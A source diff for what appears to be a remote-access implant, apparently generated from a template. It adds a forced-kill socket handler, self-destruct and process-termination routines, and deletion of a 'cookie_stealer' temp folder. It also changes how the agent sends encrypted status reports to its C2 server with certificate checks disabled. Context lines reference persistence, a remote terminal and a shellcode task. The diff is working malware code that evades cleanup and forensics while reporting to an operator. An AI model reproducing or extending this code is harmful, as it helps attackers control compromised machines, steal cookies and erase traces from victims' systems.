@@ -1233,6 +1233,11 @@ class WebSocketClient:
                     'error': f"Command processing error: {{str(e)}}",
                     'current_dir': self.current_dir
                 }}, namespace='/terminal')
+        
+        @self.socket.on('force_kill', namespace='/terminal')
+        def on_force_kill(data):
+            self._log_info("[!] Received forced kill command")
+            self._immediate_self_destruct()
 
     def connect(self):
         try:
@@ -1295,6 +1300,8 @@ class WebSocketClient:
         except Exception as e:
             self.logger.error(f"WebSocket connection failed: {{str(e)}}")
             return False
+    
+   
         
     def _execute_command(self, command):
         try:
@@ -1428,6 +1435,85 @@ class Agent:
 
         self._checkin_count += 1
         return data
+    
+    def _immediate_self_destruct(self):
+        """Force immediate termination with server notification"""
+        try:
+            # 1. Disconnect all active connections
+            self.stop()
+            
+            # 2. Remove all persistence mechanisms
+            self._remove_persistence()
+            
+            # 3. Additional cleanup - delete temporary files
+            self._cleanup_temp_files()
+            
+            # 4. Try to notify server (best effort)
+            try:
+                requests.post(
+                    f"{{self.config.C2_SERVER}}/api/agent_terminated",
+                    data=self.crypto.encrypt({{
+                        "agent_id": self.agent_id,
+                        "status": "killed",
+                        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                    }}),
+                    headers={{
+                        "User-Agent": self.config.USER_AGENT,
+                        "Content-Type": "application/octet-stream"
+                    }},
+                    timeout=2,
+                    verify=False
+                )
+            except:
+                pass
+            
+            # 5. Forceful process termination
+            self._force_kill_process()
+            
+        except Exception as e:
+            self._log_error(f"Termination error: {{str(e)}}")
+        finally:
+            os._exit(0)
+
+    def _cleanup_temp_files(self):
+        """Clean up any temporary files created by the agent"""
+        try:
+            temp_dirs = [
+                os.path.join(os.getenv('TEMP'), 'cookie_stealer'),
+                os.path.join(os.getenv('PUBLIC'), 'documents')
+            ]
+            
+            for temp_dir in temp_dirs:
+                try:
+                    if os.path.exists(temp_dir):
+                        shutil.rmtree(temp_dir, ignore_errors=True)
+                except:
+                    pass
+        except:
+            pass
+
+    def _force_kill_process(self):
+        """Platform-specific forceful process termination"""
+        try:
+            if platform.system() == "Windows":
+                # Windows specific forceful termination
+                import ctypes
+                PROCESS_TERMINATE = 0x0001
+                handle = ctypes.windll.kernel32.OpenProcess(
+                    PROCESS_TERMINATE, 
+                    False, 
+                    os.getpid()
+                )
+                ctypes.windll.kernel32.TerminateProcess(handle, -1)
+                ctypes.windll.kernel32.CloseHandle(handle)
+            else:
+                # Unix-like systems
+                os.kill(os.getpid(), signal.SIGKILL)
+        except:
+            os._exit(0)
+
+
+
     def _check_killdate(self):
         try:
             # Skip if killdate is not enabled or empty
@@ -1445,13 +1531,31 @@ class Agent:
         
     def _self_destruct(self):
         """Remove persistence and delete itself"""
-        self._log_info("[!] Killdate reached - initiating self-destruct")
+        self._log_info("[!] Kill command received - initiating self-destruct")
         
         # 1. Remove persistence
         self._remove_persistence()
         
-        # 2. Notify C2
-        self._notify_killdate_reached()
+        # 2. Notify C2 (try best effort but don't block if it fails)
+        try:
+            data = {{
+                "agent_id": self.agent_id,
+                "message": "Kill command executed - self-destruct initiated",
+                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+            }}
+            
+            requests.post(
+                f"{{self.config.C2_SERVER}}/api/killdate_reached",
+                data=self.crypto.encrypt(data),
+                headers={{
+                    "User-Agent": self.config.USER_AGENT,
+                    "Content-Type": "application/octet-stream"
+                }},
+                timeout=5,  # Short timeout since we're shutting down
+                verify=False
+            )
+        except Exception as e:
+            self._log_error(f"Error notifying C2: {{str(e)}}")
         
         # 3. Delete itself
         self._delete_self()
@@ -1657,13 +1761,53 @@ class Agent:
             
             #Kill-pill
             elif task_type == "kill":
-                self._log_info("[!] Received kill command from C2 - initiating self-destruct")
-                # Use the same self-destruct sequence as killdate
+                if task.get("data", {{}}).get("force"):
+                    # Send confirmation before killing
+                    try:
+                        requests.post(
+                            f"{{self.config.C2_SERVER}}/api/agent_terminated",
+                            data=self.crypto.encrypt({{
+                                "agent_id": self.agent_id,
+                                "status": "killing",
+                                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                            }}),
+                            headers={{
+                                "User-Agent": self.config.USER_AGENT,
+                                "Content-Type": "application/octet-stream"
+                            }},
+                            timeout=2,
+                            verify=False
+                        )
+                    except:
+                        pass
+                    
+                    self._immediate_self_destruct()
+                    return {{"status": "killing"}}
+                
+                # Normal kill with cleanup
+                self._log_info("[!] Received kill command - initiating self-destruct")
+                
+                # Send confirmation first
+                try:
+                    requests.post(
+                        f"{{self.config.C2_SERVER}}/api/agent_terminated",
+                        data=self.crypto.encrypt({{
+                            "agent_id": self.agent_id,
+                            "status": "killing",
+                            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                        }}),
+                        headers={{
+                            "User-Agent": self.config.USER_AGENT,
+                            "Content-Type": "application/octet-stream"
+                        }},
+                        timeout=2,
+                        verify=False
+                    )
+                except:
+                    pass
+                    
                 self._self_destruct()
-                return {{
-                    "status": "success",
-                    "message": "Self-destruct initiated"
-                }}
+                return {{"status": "destructing"}}
 
 
             elif task_type == "shellcode":
